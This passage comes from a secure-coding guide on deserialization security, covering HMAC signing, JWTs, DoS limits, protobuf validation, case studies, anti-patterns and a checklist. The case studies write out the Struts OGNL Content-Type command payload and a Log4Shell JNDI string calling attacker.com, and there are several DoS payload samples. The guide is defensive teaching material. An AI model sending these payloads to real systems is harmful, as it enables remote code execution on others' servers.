5. **Prefer migration to safe formats** -- type allowlisting is a mitigation, not a solution. Plan migration to JSON/Protobuf.

---

## 11. Integrity Verification

Even with safe serialization formats, an attacker who can modify serialized data in transit or at rest can tamper with field values (change prices, roles, permissions). Integrity verification ensures that the data has not been modified since it was serialized by a trusted party.

### HMAC Signatures on Serialized Data

```python
# SECURE: Sign serialized data with HMAC before storing/transmitting.
# Verify the signature before deserializing.

import hmac
import hashlib
import json
import os
from typing import Any

SECRET_KEY = os.environ["SERIALIZATION_HMAC_KEY"].encode()

def serialize_with_hmac(data: dict) -> bytes:
    """Serialize data and attach an HMAC signature."""
    payload = json.dumps(data, sort_keys=True, separators=(",", ":")).encode()
    signature = hmac.new(SECRET_KEY, payload, hashlib.sha256).hexdigest()
    # Return format: signature.payload
    return f"{signature}.".encode() + payload

def deserialize_with_hmac(signed_data: bytes) -> dict:
    """Verify HMAC signature, then deserialize. Reject tampered data."""
    try:
        sig_hex, payload = signed_data.split(b".", 1)
    except ValueError:
        raise ValueError("Invalid signed data format")

    # Compute expected signature
    expected_sig = hmac.new(SECRET_KEY, payload, hashlib.sha256).hexdigest()

    # Constant-time comparison prevents timing attacks
    if not hmac.compare_digest(sig_hex.decode(), expected_sig):
        raise ValueError("HMAC verification failed -- data has been tampered with")

    return json.loads(payload)
```

### Signed Cookies

```typescript
// SECURE: Use signed cookies to prevent session tampering

import express from "express";
import cookieParser from "cookie-parser";

const app = express();

// cookieParser with a secret enables cookie signing
app.use(cookieParser(process.env.COOKIE_SECRET));

app.post("/login", (req, res) => {
    // Signed cookie -- the framework appends an HMAC signature
    res.cookie("session", JSON.stringify({ userId: user.id, role: user.role }), {
        signed: true,       // HMAC signature appended
        httpOnly: true,     // Not accessible from JavaScript
        secure: true,       // HTTPS only
        sameSite: "strict", // CSRF protection
        maxAge: 3600000,    // 1 hour
    });
    res.json({ success: true });
});

app.get("/profile", (req, res) => {
    // req.signedCookies contains only cookies whose HMAC is valid.
    // Tampered cookies are excluded (returned as false).
    const session = req.signedCookies.session;
    if (!session) {
        return res.status(401).json({ error: "Invalid session" });
    }
    const data = JSON.parse(session);
    res.json({ userId: data.userId });
});
```

### JWT Integrity

```typescript
// SECURE: Use JWTs with strong signing for serialized claims

import jwt from "jsonwebtoken";

const JWT_SECRET = process.env.JWT_SECRET!;

// Sign: Serialize claims into a signed JWT
function createToken(user: { id: string; role: string }): string {
    return jwt.sign(
        { sub: user.id, role: user.role },
        JWT_SECRET,
        {
            algorithm: "HS256",  // Use RS256 for asymmetric if cross-service
            expiresIn: "1h",
            issuer: "myapp",
        }
    );
}

// Verify: Check signature BEFORE reading claims
function verifyToken(token: string): { sub: string; role: string } {
    // jwt.verify() checks the HMAC signature and expiration.
    // If the token has been tampered with, it throws.
    const payload = jwt.verify(token, JWT_SECRET, {
        algorithms: ["HS256"],  // Explicitly restrict algorithms
        issuer: "myapp",
    });
    return payload as { sub: string; role: string };
}
```

### Integrity Verification Principles

1. **Sign before storing, verify before reading.** Never deserialize unsigned data from untrusted storage (cookies, URL parameters, client-side storage, message queues).
2. **Use constant-time comparison** for signature verification. `hmac.compare_digest()` in Python, `crypto.timingSafeEqual()` in Node.js. Avoid `===` for signature comparison -- it leaks timing information.
3. **Use separate keys per purpose.** The HMAC key for cookies should differ from the HMAC key for API tokens. Key compromise in one domain should not affect another.
4. **Rotate keys** on a schedule and maintain backward compatibility during rotation (accept signatures from both old and new keys during the transition window).

---

## 12. Deserialization Denial of Service

Even safe serialization formats can be exploited for denial of service. An attacker can craft payloads that consume excessive memory, CPU, or time during parsing.

### Attack Vectors

**Deeply nested objects:**
```json
{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":
{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":
"deep"}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}
```
Each nesting level consumes stack space. Thousands of levels cause stack overflow or excessive memory allocation.

**Circular references (in formats that support them):**
```python
# Pickle and other native formats support circular references.
# A payload with circular references can cause infinite loops in processing code.
a = []
a.append(a)  # a[0] is a itself -- infinite recursion when traversed
```

**Billion Laughs equivalent in JSON:**
```json
{
  "a": "AAAAAAAAAA",
  "b": ["AAAAAAAAAA","AAAAAAAAAA","AAAAAAAAAA","AAAAAAAAAA","AAAAAAAAAA",
        "AAAAAAAAAA","AAAAAAAAAA","AAAAAAAAAA","AAAAAAAAAA","AAAAAAAAAA"]
}
```
Multiply this pattern to create a small payload (kilobytes) that expands to gigabytes when fully parsed into objects with string interning disabled.

**Hash collision DoS (HashDoS):**
An attacker sends JSON with keys that all hash to the same bucket, turning O(1) hash lookups into O(n) linear scans. Parsing millions of colliding keys makes the server unresponsive.

### Defenses

```typescript
// SECURE: Enforce size limits, depth limits, and timeouts during deserialization

import { z } from "zod";

// Defense 1: Limit raw input size BEFORE parsing
app.use(express.json({
    limit: "1mb",  // Reject payloads larger than 1 MB
}));

// Defense 2: Limit JSON parsing depth
function parseJsonSafe(input: string, maxDepth: number = 20): unknown {
    let depth = 0;
    const result = JSON.parse(input, (key, value) => {
        if (typeof value === "object" && value !== null) {
            depth++;
            if (depth > maxDepth) {
                throw new Error(`JSON depth exceeds maximum of ${maxDepth}`);
            }
        }
        return value;
    });
    return result;
}

// Defense 3: Schema validation with size constraints
const OrderSchema = z.object({
    items: z.array(z.object({
        id: z.string().uuid(),
        quantity: z.number().int().positive().max(10000),
    })).max(1000),  // Maximum 1000 items per order
}).strict();  // Reject unknown fields

// Defense 4: Timeout for deserialization (useful for binary formats)
async function parseWithTimeout<T>(
    parser: () => T,
    timeoutMs: number = 5000
): Promise<T> {
    return Promise.race([
        new Promise<T>((resolve) => resolve(parser())),
        new Promise<T>((_, reject) =>
            setTimeout(() => reject(new Error("Parse timeout")), timeoutMs)
        ),
    ]);
}
```

```java
// SECURE: Java ObjectInputFilter with resource limits

ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "com.myapp.dto.*;"
    + "java.lang.*;"
    + "maxdepth=10;"      // Prevent deeply nested objects
    + "maxrefs=1000;"     // Prevent excessive object references
    + "maxbytes=102400;"  // Limit stream to 100 KB
    + "maxarray=10000;"   // Limit array sizes
    + "!*"
);
```

```python
# SECURE: Python JSON with depth and size limits

import json
import sys

def safe_json_loads(data: str, max_size: int = 1_000_000, max_depth: int = 20) -> dict:
    """Parse JSON with size and depth restrictions."""
    if len(data) > max_size:
        raise ValueError(f"JSON payload exceeds maximum size of {max_size} bytes")

    parsed = json.loads(data)

    def check_depth(obj, current_depth=0):
        if current_depth > max_depth:
            raise ValueError(f"JSON nesting depth exceeds maximum of {max_depth}")
        if isinstance(obj, dict):
            for value in obj.values():
                check_depth(value, current_depth + 1)
        elif isinstance(obj, list):
            for item in obj:
                check_depth(item, current_depth + 1)

    check_depth(parsed)
    return parsed
```

---

## 13. Protocol Buffers Security

Protocol Buffers (protobuf) are safe by design for deserialization because they do not encode type names or invoke constructors. However, they still require attention to security.

### protobuf Is Not a Complete Security Solution

```protobuf
// user.proto
syntax = "proto3";

message UserProfile {
    string name = 1;           // Validate length and content
    string email = 2;          // Validate email format
    int32 age = 3;             // Validate range
    string bio = 4;            // Validate length -- unbounded strings are a DoS risk
    repeated string tags = 5;  // Validate count -- unbounded repeated fields are a DoS risk
}
```

### Security Considerations

```python
# Protobuf messages still require business logic validation.
# The .proto schema enforces structure and types, but not business rules.

from generated_pb2 import UserProfile

def process_user_profile(data: bytes) -> dict:
    profile = UserProfile()
    profile.ParseFromString(data)

    # Protobuf guarantees: name is a string, age is an int32, tags is a list of strings.
    # Protobuf does NOT guarantee: name is non-empty, age is positive, email is valid.

    # You must validate business rules after deserialization:
    if not profile.name or len(profile.name) > 200:
        raise ValueError("Name must be 1-200 characters")

    if not _is_valid_email(profile.email):
        raise ValueError("Invalid email format")

    if profile.age < 0 or profile.age > 150:
        raise ValueError("Age must be between 0 and 150")

    if len(profile.bio) > 10000:
        raise ValueError("Bio must not exceed 10000 characters")

    if len(profile.tags) > 50:
        raise ValueError("Maximum 50 tags allowed")

    return {
        "name": profile.name,
        "email": profile.email,
        "age": profile.age,
    }
```

### Protobuf-Specific Risks

```python
# Risk 1: Unknown fields
# Proto3 preserves unknown fields by default. If you re-serialize a message,
# unknown fields are included. This can be used to smuggle data through systems.

profile = UserProfile()
profile.ParseFromString(data_with_unknown_fields)
# profile now contains fields not defined in the .proto schema.
# If you re-serialize and forward, the unknown data is preserved.

# Mitigation: Discard unknown fields explicitly
profile.DiscardUnknownFields()

# Risk 2: Large messages
# A malicious client can send a protobuf message of arbitrary size.
# Protobuf parsers allocate memory proportional to message size.

# Mitigation: Limit message size before parsing
MAX_MESSAGE_SIZE = 10 * 1024 * 1024  # 10 MB

def parse_limited(data: bytes) -> UserProfile:
    if len(data) > MAX_MESSAGE_SIZE:
        raise ValueError(f"Message exceeds maximum size of {MAX_MESSAGE_SIZE} bytes")
    profile = UserProfile()
    profile.ParseFromString(data)
    return profile
```

```go
// Go: Limit protobuf message size
import "google.golang.org/protobuf/proto"

func parseUserProfile(data []byte) (*pb.UserProfile, error) {
    const maxSize = 10 * 1024 * 1024 // 10 MB
    if len(data) > maxSize {
        return nil, fmt.Errorf("message size %d exceeds limit %d", len(data), maxSize)
    }

    profile := &pb.UserProfile{}
    opts := proto.UnmarshalOptions{
        DiscardUnknown: true,  // Discard unknown fields
    }
    if err := opts.Unmarshal(data, profile); err != nil {
        return nil, fmt.Errorf("failed to parse protobuf: %w", err)
    }
    return profile, nil
}
```

### Field Presence Checking (proto3)

```protobuf
// In proto3, scalar fields have default values (0, "", false).
// You cannot distinguish "field was set to 0" from "field was not sent."
// Use optional keyword for fields where presence matters.

syntax = "proto3";

message PaymentRequest {
    string order_id = 1;
    optional int32 discount_percent = 2;  // Can check if field was set
    int64 amount_cents = 3;
}
```

```go
// Go: Check field presence
func processPayment(req *pb.PaymentRequest) error {
    if req.OrderId == "" {
        return fmt.Errorf("order_id is required")
    }

    // Check if discount was explicitly set (not just default 0)
    if req.DiscountPercent != nil {
        discount := req.GetDiscountPercent()
        if discount < 0 || discount > 100 {
            return fmt.Errorf("discount must be 0-100, got %d", discount)
        }
    }

    if req.AmountCents <= 0 {
        return fmt.Errorf("amount must be positive")
    }

    return nil
}
```

---

## 14. Real-World Exploits

Understanding real-world exploits reinforces why deserialization safety is non-negotiable. Each of these incidents affected millions of users or caused billions of dollars in damage.

### Apache Commons Collections (2015)

**CVE:** Multiple (CVE-2015-4852 and related)
**Impact:** Remote code execution on any Java application with Commons Collections 3.x on the classpath
**Root cause:** The `InvokerTransformer` class in Apache Commons Collections could be chained with other transformers to invoke arbitrary methods. When a Java application deserialized an `ObjectInputStream` containing a crafted `TransformedMap` or `LazyMap`, the transformer chain executed arbitrary commands.
**Affected systems:** WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and thousands of custom Java applications.

```
Attack flow:
1. Attacker identifies endpoint accepting Java serialized objects
2. Attacker generates payload using ysoserial CommonsCollections1
3. Payload chains: AnnotationInvocationHandler -> LazyMap -> ChainedTransformer
   -> InvokerTransformer -> Runtime.exec("malicious command")
4. Application deserializes the payload with ObjectInputStream
5. readObject() triggers the gadget chain -> RCE
```

**Lesson:** Remove unused libraries from the classpath. If you do not use Apache Commons Collections transformers, the gadget chain cannot work. Better yet, do not use `ObjectInputStream` for untrusted data.

### Apache Struts (CVE-2017-5638) -- The Equifax Breach

**CVE:** CVE-2017-5638
**Impact:** Remote code execution via crafted Content-Type header
**Root cause:** Apache Struts 2 used OGNL (Object-Graph Navigation Language) to evaluate expressions in error messages. When a multipart file upload failed, the Content-Type header value was included in an error message that was evaluated as an OGNL expression. An attacker could inject OGNL expressions into the Content-Type header.

```
Attack flow:
1. Attacker sends HTTP request with crafted Content-Type header:
   Content-Type: %{(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name')
   .toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd}))
   .(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true))
   .(#process=#p.start())}
2. Struts multipart parser fails, constructs error message with Content-Type
3. OGNL evaluates the expression in the error message
4. ProcessBuilder executes the attacker's command
```

**Lesson:** This is a deserialization-adjacent vulnerability -- OGNL expression evaluation is a form of deserializing code from untrusted input. Never evaluate expressions from untrusted data. Keep frameworks patched.

### Jenkins Deserialization (2015-2016)

**CVE:** CVE-2015-8103, CVE-2016-0792
**Impact:** Unauthenticated remote code execution on Jenkins servers
**Root cause:** Jenkins' CLI interface accepted Java serialized objects over the network. The Jenkins classpath included Apache Commons Collections, providing the gadget chain needed for exploitation. An unauthenticated attacker could send a crafted serialized object to the Jenkins CLI port and achieve code execution.

```
Attack flow:
1. Attacker connects to Jenkins CLI port (typically port 50000)
2. Sends ysoserial CommonsCollections payload
3. Jenkins deserializes the payload using ObjectInputStream
4. Gadget chain triggers Runtime.exec()
5. Attacker gains shell access to Jenkins server
6. Jenkins server typically has credentials for production deployment
```

**Lesson:** Never expose deserialization endpoints to unauthenticated users. Jenkins fixed this by adding authentication to the CLI interface and implementing deserialization filters.

### Log4Shell (CVE-2021-44228)

**CVE:** CVE-2021-44228
**Impact:** Remote code execution in any Java application using Log4j 2.x (< 2.17.0)
**Root cause:** Log4j's message lookup feature supported JNDI (Java Naming and Directory Interface) lookups in logged strings. When a log message contained `${jndi:ldap://attacker.com/exploit}`, Log4j connected to the attacker's LDAP server, downloaded a Java class, and deserialized/executed it.

```
Attack flow:
1. Attacker sends input containing: ${jndi:ldap://attacker.com/exploit}
   (in any field that gets logged: User-Agent, username, search query, etc.)
2. Application logs the input: logger.info("User searched for: " + userInput)
3. Log4j evaluates the JNDI lookup in the log message
4. Log4j connects to attacker's LDAP server
5. LDAP server returns a reference to a malicious Java class
6. Java loads and instantiates the class (deserialization of remote code)
7. RCE achieved
```

**Lesson:** Log4Shell demonstrates the intersection of log injection and deserialization. The JNDI lookup triggered a remote class loading operation, which is fundamentally a deserialization of untrusted code. Disable JNDI lookups in logging frameworks. Never evaluate expressions in logged data. Update Log4j to 2.17.0+.

### .NET BinaryFormatter Exploits

Multiple CVEs have targeted .NET applications using `BinaryFormatter`, including attacks against SharePoint, Exchange Server, and custom .NET applications. Microsoft's response was to deprecate `BinaryFormatter` entirely and remove it from .NET 9+.

```
Attack flow:
1. Attacker identifies a .NET application that deserializes BinaryFormatter data
   (ViewState, remoting, custom binary protocols)
2. Attacker uses ysoserial.net to generate a .NET gadget chain payload
   (TypeConfuseDelegate, WindowsIdentity, ClaimsIdentity, DataSet)
3. Application calls BinaryFormatter.Deserialize() on the payload
4. Gadget chain triggers Process.Start() or equivalent -> RCE
```

**Lesson:** Microsoft's decision to remove `BinaryFormatter` entirely is the correct approach. If the vendor declares a feature permanently unsafe, stop using it immediately.

---

## Best Practices

### 1. Never Deserialize Untrusted Data with Type-Reconstructing Formats

Do not use `pickle.loads()`, `ObjectInputStream.readObject()`, `unserialize()`, `Marshal.load`, `BinaryFormatter.Deserialize()`, or `node-serialize.unserialize()` on data from untrusted sources. These formats can instantiate arbitrary types and execute code during deserialization. Use JSON, Protocol Buffers, MessagePack, or Avro instead.

### 2. Use Data-Only Serialization Formats

Select serialization formats that encode values, not types. JSON, Protocol Buffers, MessagePack, CBOR, Avro, and FlatBuffers are data-only formats. They cannot trigger class instantiation, constructor execution, or method invocation during parsing. They are safe by design.

### 3. Validate After Deserialization

Even with safe formats, validate every field after deserialization. Protobuf enforces types but not business rules. JSON enforces nothing beyond syntax. Use schema validation libraries (Zod, Pydantic, JSON Schema, Bean Validation) to enforce field constraints: type, length, range, format, enum membership, and required presence.

### 4. Sign Serialized Data That Crosses Trust Boundaries

Attach HMAC signatures or use JWTs for any serialized data stored in untrusted locations: cookies, URL parameters, client-side storage, message queues with shared access, database rows writable by multiple services. Verify the signature before deserialization. Use constant-time comparison.

### 5. Apply Type Allowlisting When Native Deserialization Is Unavoidable

If legacy constraints force the use of native serialization, implement strict type allowlisting. Use `ObjectInputFilter` in Java, `RestrictedUnpickler` in Python, `allowed_classes` in PHP, and custom `ISerializationBinder` in .NET. The allowlist must deny all types by default and permit only the specific types your application needs.

### 6. Enforce Size and Depth Limits

Limit the size of serialized input before parsing (reject payloads over a threshold). Limit nesting depth to prevent stack exhaustion. Limit array/collection sizes to prevent memory exhaustion. Set timeouts on deserialization operations.

### 7. Remove Unnecessary Libraries from the Classpath

Every library on the classpath is a potential source of gadget chains. Remove libraries you do not actively use. In Java, removing Apache Commons Collections eliminates the most commonly exploited gadget chain family. Audit dependencies regularly with `mvn dependency:tree` or `gradle dependencies`.

### 8. Disable TypeNameHandling in JSON Libraries

In Newtonsoft.Json (.NET), set `TypeNameHandling = TypeNameHandling.None`. In Jackson (Java), do not enable `DefaultTyping` without a `PolymorphicTypeValidator`. In any JSON library that supports embedding type information in JSON, disable that feature unless you have an explicit, documented requirement and a strict type allowlist.

### 9. Encrypt Sensitive Serialized Data

If serialized data contains sensitive fields (session tokens, user roles, payment information), encrypt it in addition to signing it. Encryption prevents information disclosure. Signing prevents tampering. Apply both: encrypt-then-sign or use authenticated encryption (AES-GCM).

### 10. Plan Migration Away from Native Serialization

If your system currently uses native serialization (Java `Serializable`, Python `pickle`, Ruby `Marshal`), create a migration plan to replace it with a safe format. The migration typically involves: (a) adding a safe format alongside the native format, (b) writing both formats during a transition period, (c) reading both formats during the transition, (d) dropping native format support after all data has been re-serialized.

---

## Anti-Patterns

### 1. Trusting Internal Sources

| Problem | Consequence | Fix |
|---------|-------------|-----|
| Deserializing pickle/Java objects from Redis, databases, or message queues because "only our services write to them" | If any service is compromised, the attacker can write malicious serialized data to the shared store, which other services deserialize | Treat all data from shared stores as untrusted. Use data-only formats. Sign serialized data with per-service keys |

### 2. Using pickle for Caching

| Problem | Consequence | Fix |
|---------|-------------|-----|
| Using `pickle.dumps()` / `pickle.loads()` to cache Python objects in Redis or Memcached | A compromised cache server or cache poisoning attack delivers malicious pickle data to the application | Use `json.dumps()` / `json.loads()` or `msgpack.packb()` / `msgpack.unpackb()` for cache serialization. Implement HMAC signatures on cached data |

### 3. Accepting Serialized Objects in API Endpoints

| Problem | Consequence | Fix |
|---------|-------------|-----|
| An API endpoint accepts `Content-Type: application/x-java-serialized-object` or `application/x-python-pickle` | Any HTTP client can send a crafted payload and achieve RCE | API endpoints must accept only data-only formats (JSON, Protobuf). Reject Content-Type headers for native serialization formats. Remove any code that calls `ObjectInputStream` or `pickle.loads()` on HTTP request bodies |

### 4. Enabling TypeNameHandling in Newtonsoft.Json

| Problem | Consequence | Fix |
|---------|-------------|-----|
| Setting `TypeNameHandling = TypeNameHandling.Auto` (or All, or Objects) in Newtonsoft.Json without a custom `ISerializationBinder` | Attacker includes `$type` in JSON payload to instantiate `ObjectDataProvider`, `WindowsIdentity`, or other dangerous .NET types | Set `TypeNameHandling = TypeNameHandling.None` (the default). If polymorphic deserialization is needed, use a strict `ISerializationBinder` allowlist. Prefer `System.Text.Json` which does not support type name handling |

### 5. Ignoring Deserialization in Dependency Audit

| Problem | Consequence | Fix |
|---------|-------------|-----|
| Running dependency vulnerability scanners (Dependabot, Snyk) but not auditing how dependencies use deserialization internally | A library may internally call `ObjectInputStream`, `pickle.loads()`, or `eval()` on data you pass to it | Audit library source code for deserialization calls. Use SCA tools that detect deserialization patterns, not just CVE databases. Prefer libraries that document their serialization format |

### 6. Deserializing Then Validating

| Problem | Consequence | Fix |
|---------|-------------|-----|
| Calling `pickle.loads()` or `ObjectInputStream.readObject()` first, then validating the result | The exploit occurs DURING deserialization, before your validation code runs. Validation after deserialization is too late | Validate the format and integrity BEFORE deserialization. Use safe formats that cannot execute code during parsing. Apply type filters (ObjectInputFilter) that operate DURING deserialization |

### 7. Using eval() or Function() as Deserializers

| Problem | Consequence | Fix |
|---------|-------------|-----|
| Using `eval(jsonString)` in Python or `new Function("return " + data)()` in JavaScript to parse data | `eval()` and `Function()` execute arbitrary code. An attacker who controls the input string achieves RCE | Use `json.loads()` in Python, `JSON.parse()` in JavaScript. Never use `eval()` to parse data |

### 8. Storing Serialized Objects in Cookies Without Signing

| Problem | Consequence | Fix |
|---------|-------------|-----|
| Storing serialized session data in cookies (base64-encoded pickle, Java serialized objects, PHP serialized strings) without HMAC signature | The client controls the cookie value. The attacker can modify serialized fields (role, permissions) or replace the cookie with a malicious payload | Use signed and encrypted cookies. Store session data server-side (Redis, database) and only store a session ID in the cookie. If session data must be in the cookie, use JWTs with HMAC or asymmetric signatures |

---

## Enforcement Checklist

### Python

- [ ] `pickle.loads()` is never called on untrusted data (HTTP requests, files, caches, databases, message queues)
- [ ] If pickle is used for ML models or internal data, `RestrictedUnpickler` with a strict allowlist is implemented
- [ ] `json.loads()` with Pydantic or marshmallow validation is used for all data interchange
- [ ] `yaml.safe_load()` is used instead of `yaml.load()` (yaml.load can execute arbitrary Python)
- [ ] `eval()` and `exec()` are never used to parse data
- [ ] Cache serialization uses JSON or MessagePack, not pickle

### Java

- [ ] `ObjectInputStream.readObject()` is never called on untrusted data
- [ ] If `ObjectInputStream` is unavoidable, `ObjectInputFilter` is configured with a strict allowlist and `!*` deny-all default
- [ ] Process-wide `jdk.serialFilter` is set via system property or `ObjectInputFilter.Config.setSerialFilter()`
- [ ] Apache Commons Collections 3.x is removed or upgraded to 4.x (where dangerous transformers are removed)
- [ ] Jackson `DefaultTyping` is not enabled without `PolymorphicTypeValidator`
- [ ] ysoserial payloads are included in penetration testing
- [ ] Unused libraries are removed from the classpath to minimize gadget chain surface

### PHP

- [ ] `unserialize()` is never called on untrusted data
- [ ] If `unserialize()` is unavoidable, `allowed_classes` is set to `false` or a strict allowlist
- [ ] `json_decode()` is used for all data interchange
- [ ] Magic methods (`__wakeup`, `__destruct`, `__toString`) in application classes are audited for dangerous operations
- [ ] Session serialization uses JSON handler (`session.serialize_handler = php_serialize` with JSON storage)

### Ruby

- [ ] `Marshal.load` is never called on untrusted data
- [ ] Rails cookie serializer is set to `:json` (not `:marshal`)
- [ ] `JSON.parse()` with schema validation is used for all data interchange
- [ ] MessagePack or Protocol Buffers is used for binary data interchange

### .NET

- [ ] `BinaryFormatter` is not used anywhere in the codebase
- [ ] `NetDataContractSerializer`, `SoapFormatter`, `LosFormatter`, and `ObjectStateFormatter` are not used with untrusted data
- [ ] Newtonsoft.Json `TypeNameHandling` is set to `None` everywhere
- [ ] If `TypeNameHandling` is required, a custom `ISerializationBinder` with strict allowlist is implemented
- [ ] `System.Text.Json` is preferred over Newtonsoft.Json for new code
- [ ] `ViewState` MAC validation is enabled (not disabled in web.config)

### JavaScript / Node.js

- [ ] `node-serialize`, `funcster`, and any package that serializes functions are not used
- [ ] `JSON.parse()` is used for all deserialization (never `eval()` or `new Function()`)
- [ ] Schema validation (Zod, Joi, ajv) is applied after `JSON.parse()`
- [ ] Object merge functions are protected against prototype pollution (`__proto__`, `constructor`, `prototype` keys are rejected)
- [ ] `structuredClone()` or safe deep-copy libraries are used instead of recursive merge

### Go

- [ ] `encoding/gob` is not used for untrusted input (prefer `encoding/json` or protobuf)
- [ ] `json.Decoder.DisallowUnknownFields()` is enabled for strict parsing
- [ ] Input size is limited with `io.LimitReader` before decoding
- [ ] Protobuf messages are validated with business logic after parsing

### Integrity and Transport

- [ ] All serialized data in cookies is signed (HMAC) and optionally encrypted
- [ ] JWT signatures are verified before reading claims
- [ ] JWT `algorithm` field is restricted to a specific algorithm (not `none`, not attacker-controlled)
- [ ] HMAC comparison uses constant-time comparison functions
- [ ] Signing keys are rotated on a defined schedule
- [ ] Separate keys are used for separate purposes (cookie signing vs. API token signing)

### Infrastructure and CI/CD

- [ ] Static analysis (semgrep, CodeQL, Bandit, SpotBugs) scans for deserialization patterns in CI
- [ ] Semgrep rules flag `pickle.loads`, `ObjectInputStream`, `unserialize`, `Marshal.load`, `BinaryFormatter`, `eval`
- [ ] Dependency scanners flag known deserialization gadget chain libraries (Commons Collections 3.x, vulnerable Spring versions)
- [ ] Penetration testing includes deserialization attack scenarios (ysoserial, custom pickle payloads)
- [ ] Web Application Firewall (WAF) rules detect serialized Java objects in HTTP traffic (magic bytes `AC ED 00 05`)
- [ ] Network segmentation limits the blast radius of a deserialization exploit (compromised service cannot reach all internal resources)

### Monitoring and Response

- [ ] Deserialization errors are logged (not swallowed) for security monitoring
- [ ] Anomalous serialization patterns (unexpected object types, oversized payloads) trigger alerts
- [ ] Incident response playbook includes deserialization exploit scenarios
- [ ] Known gadget chain CVEs are tracked and patched within SLA

---

## CWE and OWASP Reference Map

| Vulnerability | CWE | OWASP Top 10 2021 |
|---------------|-----|-------------------|
| Deserialization of Untrusted Data | CWE-502 | A08:2021 Software and Data Integrity Failures |
| Improper Control of Dynamically-Determined Object Attributes | CWE-915 | A08:2021 Software and Data Integrity Failures |
| Use of Inherently Dangerous Function (eval, BinaryFormatter) | CWE-242 | A08:2021 Software and Data Integrity Failures |
| Insufficient Verification of Data Authenticity (missing HMAC) | CWE-345 | A08:2021 Software and Data Integrity Failures |
| Uncontrolled Resource Consumption (deser DoS) | CWE-400 | A05:2021 Security Misconfiguration |
| Prototype Pollution | CWE-1321 | A03:2021 Injection |
